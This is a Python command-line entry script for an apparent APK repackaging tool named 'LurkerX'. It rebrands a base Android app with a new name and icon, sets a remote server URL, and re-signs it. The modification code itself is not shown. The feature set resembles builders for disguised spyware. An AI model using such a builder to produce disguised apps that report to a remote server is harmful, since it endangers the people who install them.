import argparse
import sys

from packager.config import load_manifest, load_ini, clear_screen, type_text, get_colored_figlet
from packager.apk import modify_apk
from colorama import Fore
from pathlib import Path


def parse_args():
    parser = argparse.ArgumentParser(description="LurkerX APK modifier")
    parser.add_argument("--name", help="Override app name from choices.ini")
    parser.add_argument("--icon", help="Override launcher icon path from choices.ini")
    parser.add_argument("--url", help="Override server URL from choices.ini")
    return parser.parse_args()


if __name__ == "__main__":
    base_dir = Path(__file__).parent.parent.resolve()
    ini = load_ini(base_dir / "choices.ini")

    app_name = ini.get("app", "name", fallback="LurkerX")
    app_icon = Path(ini.get("content", "icon", fallback="icon.png"))
    server_url = ini.get("behavior", "remoteurl", fallback="http://localhost:5000")

    args = parse_args()
    if args.name:
        app_name = args.name
    if args.icon:
        app_icon = Path(args.icon)
    if args.url:
        server_url = args.url

    manifest = load_manifest(base_dir / "manifest.json")
    base_apk = Path(ini.get("decompile", "from"))
    keystore = Path(ini.get("sign", "keystore"))
    keystore_pass = ini.get("sign", "keystore_pass")
    keystore_alias = ini.get("sign", "alias", fallback=None)

    if not base_apk.exists():
        print(f"{Fore.RED}[ERROR] Base APK not found: {base_apk}{Fore.RESET}")
        print(f"{Fore.YELLOW}Update the [decompile] from= path in choices.ini{Fore.RESET}")
        sys.exit(1)

    if not keystore.exists():
        print(f"{Fore.RED}[ERROR] Keystore not found: {keystore}{Fore.RESET}")
        print(f"{Fore.YELLOW}Update the [sign] keystore= path in choices.ini{Fore.RESET}")
        sys.exit(1)

    if sys.stdout.isatty():
        clear_screen()
        print(get_colored_figlet(base_dir / "doom.txt"))
        type_text(f"Author: {manifest.get('author', 'Unknown')}\n", Fore.YELLOW)
        type_text(f"Version: {manifest.get('version', '1.0.0')}\n", Fore.CYAN)
    else:
        print(get_colored_figlet(base_dir / "doom.txt"))
        print(f"Author: {manifest.get('author', 'Unknown')}")
        print(f"Version: {manifest.get('version', '1.0.0')}")

    try:
        apk = modify_apk(
            app_name=app_name,
            app_icon=app_icon,
            server_url=server_url,
            base_apk=base_apk,
            keystore=keystore,
            keystore_pass=keystore_pass,
            keystore_alias=keystore_alias,
            base_dir=base_dir,
        )
        if sys.stdout.isatty():
            type_text(f"\nSigned APK ready: {apk}\n", Fore.GREEN)
        else:
            print(f"\nSigned APK ready: {apk}")
    except SystemExit:
        raise
    except Exception as e:
        if sys.stdout.isatty():
            type_text(f"\n[ERROR] {e}\n", Fore.RED)
        else:
            print(f"\n[ERROR] {e}")
        sys.exit(1)
